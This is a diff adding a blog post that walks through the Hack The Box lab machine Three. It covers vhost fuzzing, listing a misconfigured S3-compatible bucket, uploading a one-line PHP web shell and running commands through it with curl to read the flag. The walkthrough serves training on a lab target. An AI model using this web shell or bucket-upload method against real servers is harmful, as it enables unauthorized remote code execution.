@@ -1,0 +1,136 @@
+export const frontmatter = {
+  title: "Hack The Box Three Writeup",
+  slug: "hack-the-box-three-machine-writeup",
+  category: "HTB Starting Point",
+  description:
+    "Complete walkthrough of the Hack The Box Starting Point machine Three, covering virtual host enumeration, S3-compatible object storage discovery, misconfigured bucket exploitation, arbitrary PHP file upload, remote command execution, and flag retrieval.",
+  date: "2026-06-16",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Three Writeup – S3 Bucket Exploitation to Remote Code Execution | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Three writeup demonstrating virtual host enumeration, S3 bucket discovery, AWS CLI interaction with object storage, PHP web shell upload, remote command execution, and flag retrieval.",
+};
+
+## Introduction
+
+This write-up covers the exploitation of the Hack The Box Starting Point machine Three. The objective of this machine is to demonstrate how misconfigured virtual hosts and improperly secured S3-compatible object storage services can lead to remote code execution.
+
+## Setup
+
+Download the VPN configuration file from the webpage and connect using `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To verify connectivity with the target machine, use `ping <ip_addr>`.
+
+Upon visiting the target IP address in a browser, the application redirects to `http://thetoppers.htb`, but the page fails to load.
+
+Add an entry for `thetoppers.htb` to `/etc/hosts` using `echo '<ip_addr>	thetoppers.htb' | sudo tee -a /etc/hosts`
+
+> **NOTE:** We need to add an entry to `/etc/hosts` because the domain `thetoppers.htb` is not publicly registered. When you visit the target IP in a browser using this domain, the system attempts to resolve it via public DNS servers. Since the domain does not exist publicly, DNS resolution fails. By adding the IP address and domain to `/etc/hosts`, you create a local mapping, allowing your system to resolve `thetoppers.htb` to the correct IP address without relying on external DNS servers.
+
+## Enumeration
+
+Perform a basic Nmap version detection scan with `nmap -sV <ip_addr>`
+```Nmap scan report for thetoppers.htb (10.129.149.28)
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
+```
+
+Upon visiting the target IP address in the browser, it redirected to the virtual host `thetoppers.htb`. This hostname was added to the `/etc/hosts` file to allow proper resolution during setup.
+
+To discover additional virtual hosts configured on the server, a VHOST fuzzing scan was performed using Gobuster as `gobuster vhost -u http://thetoppers.htb -w wordlist.txt --append-domain`:
+```
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://thetoppers.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  wordlist.txt
+[+] User Agent:                gobuster/3.8
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+s3.thetoppers.htb Status: 404 [Size: 21]
+c1_arvofgagit.thetoppers.htb Status: 400 [Size: 306]
+default._bimi.thetoppers.htb Status: 400 [Size: 306]
+Progress: 20000 / 20000 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+The scan revealed a new virtual host: `s3.thetoppers.htb` while the remaining entries returned status code `400`
+
+The naming convention strongly suggested that this subdomain functioned as an S3-style object storage service or file storage bucket
+
+## Exploitation
+
+Misconfigured S3 buckets are commonly vulnerable to unauthorized access, directory listing, or arbitrary file uploads.
+
+To interact with the S3-compatible storage service, the AWS CLI tool was installed on the attacking machine using the following command on a Debian-based system:
+```
+sudo apt install awscli
+```
+
+View available buckets with (`aws s3 ls --endpoint-url http://s3.thetoppers.htb`):
+```
+2026-05-12 12:36:20 thetoppers.htb
+```
+
+View contents of the `thetoppers.htb` bucket with (`aws s3 ls s3://thetoppers.htb/ --endpoint-url http://s3.thetoppers.htb`):
+```
+                           PRE images/
+2026-05-12 12:36:20          0 .htaccess
+2026-05-12 12:36:20      11952 index.php
+```
+
+Generate a simple PHP web shell using:
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Upload the generated PHP web shell to the S3 bucket with (`aws s3 cp shell.php s3://thetoppers.htb/ --endpoint-url http://s3.thetoppers.htb`):
+```
+upload: ./shell.php to s3://thetoppers.htb/shell.php             
+```
+
+Verify the upload with (`aws s3 ls s3://thetoppers.htb/ --endpoint-url http://s3.thetoppers.htb`):
+```
+                           PRE images/
+2026-05-12 12:36:20          0 .htaccess
+2026-05-12 12:36:20      11952 index.php
+2026-05-12 12:39:57         31 shell.php
+```
+
+Verify remote command execution through the uploaded web shell using (`curl http://thetoppers.htb/shell.php?cmd=id`):
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Locate the flag file with (`curl http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20flag.txt`):
+```
+/var/www/flag.txt
+```
+
+Search for the flag file using (`curl http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt`):
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+> **Note:** Instead of using a web shell for command execution, a reverse shell could also be uploaded to obtain a fully interactive session on the target system.
